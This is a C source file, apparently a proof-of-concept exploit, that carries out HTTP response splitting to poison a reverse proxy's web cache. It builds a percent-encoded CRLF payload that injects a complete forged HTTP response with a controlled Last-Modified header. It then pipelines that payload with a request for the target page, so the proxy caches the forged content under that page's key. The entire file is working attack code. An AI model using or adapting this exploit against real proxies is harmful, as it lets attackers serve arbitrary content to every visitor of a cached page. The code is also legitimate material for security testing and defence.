/*
 * response_splitting.c
 *
 * HTTP response splitting for web-cache poisoning.
 *
 * One TCP connection to the reverse proxy carries two pipelined HTTP/1.1
 * requests. The first targets a reflecting endpoint with a percent-encoded
 * parameter containing CRLF sequences; when reflected into a response header
 * it terminates the intended response early and appends a second, fully formed
 * HTTP response. The second request fetches the page to be poisoned, and the
 * proxy associates the injected response with it, caching the attacker's
 * content under that page's cache key until expiry.
 *
 * Responses are drained and discarded.
 */

#include "net_io.h"
#include "config.h"

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>

#define MAX_REQ         8192
#define MAX_PAYLOAD_RAW 4096
#define MAX_PAYLOAD_ENC (3 * MAX_PAYLOAD_RAW + 1)

/* Benign parameter value reflected before the injected CRLF sequence. */
#define LEGIT_PARAM_VALUE "1"

/* Last-Modified value injected into the poisoned response to control caching. */
#define INJECTED_LAST_MODIFIED "Tue, 06 Jan 2026 12:00:00 GMT"

#include "percent_encode.h"

/* Drain and discard proxy responses, stopping on close or ~2s of idle time. */
static void drain_proxy_responses(int fd)
{
    const int max_idle_loops = 8;      /* 8 * 250 ms = 2 s */
    const size_t max_total = 2U * 1024U * 1024U;
    int idle = 0;
    size_t total = 0;

    for (;;) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 250000;

        int r = select(fd + 1, &rfds, NULL, NULL, &tv);
        if (r < 0) {
            if (errno == EINTR) {
                continue;
            }
            return;
        }
        if (r == 0) {
            if (++idle >= max_idle_loops) {
                return;
            }
            continue;
        }

        idle = 0;
        char buf[2048];
        ssize_t n = recv(fd, buf, sizeof(buf), 0);
        if (n == 0) {
            return; /* connection closed */
        }
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            return;
        }
        total += (size_t)n;
        if (total >= max_total) {
            return;
        }
    }
}

int main(void)
{
    /* Injected second response body: exactly <HTML>marker</HTML>, no spaces. */
    char body[64];
    int n = snprintf(body, sizeof(body), "<HTML>%s</HTML>", PROOF_MARKER);
    if (n < 0 || (size_t)n >= sizeof(body)) {
        fprintf(stderr, "Error: body too large.\n");
        return 1;
    }
    size_t body_len = strlen(body);

    /*
     * Raw injected parameter value: the benign value, then CRLFs that close the
     * first response (Content-Length: 0) and inject a complete second response.
     */
    char raw[MAX_PAYLOAD_RAW];
    int raw_n = snprintf(raw, sizeof(raw),
        LEGIT_PARAM_VALUE "\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Last-Modified: %s\r\n"
        "Content-Length: %zu\r\n"
        "\r\n"
        "%s",
        INJECTED_LAST_MODIFIED, body_len, body);
    if (raw_n < 0 || (size_t)raw_n >= sizeof(raw)) {
        fprintf(stderr, "Error: payload too large.\n");
        return 1;
    }

    char enc[MAX_PAYLOAD_ENC];
    if (percent_encode((const unsigned char *)raw, (size_t)raw_n, enc, sizeof(enc)) != 0) {
        fprintf(stderr, "Error: encoded payload too large.\n");
        return 1;
    }

    /* Request 1: the splitting request (reflects the encoded payload). */
    char req1[MAX_REQ];
    int r1 = snprintf(req1, sizeof(req1),
        "GET %s?%s=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        VULN_PATH, VULN_PARAM_NAME, enc, PROXY_HOST_HEADER);
    if (r1 < 0 || (size_t)r1 >= sizeof(req1)) {
        fprintf(stderr, "Error: request 1 too large.\n");
        return 1;
    }

    /* Request 2: the innocent request for the page to poison. */
    char req2[MAX_REQ];
    int r2 = snprintf(req2, sizeof(req2),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        TARGET_PATH, PROXY_HOST_HEADER);
    if (r2 < 0 || (size_t)r2 >= sizeof(req2)) {
        fprintf(stderr, "Error: request 2 too large.\n");
        return 1;
    }

    /* Both requests must travel on the same connection, back to back. */
    int fd = connect_tcp(PROXY_IP, (uint16_t)PROXY_PORT);
    if (fd < 0) {
        fprintf(stderr, "Error: connection to proxy failed.\n");
        return 1;
    }

    if (send_all(fd, req1, (size_t)r1) != 0 ||
        send_all(fd, req2, (size_t)r2) != 0) {
        fprintf(stderr, "Error: sending requests failed.\n");
        (void)close(fd);
        return 1;
    }

    (void)shutdown(fd, SHUT_WR);
    drain_proxy_responses(fd);
    (void)close(fd);
    return 0;
}
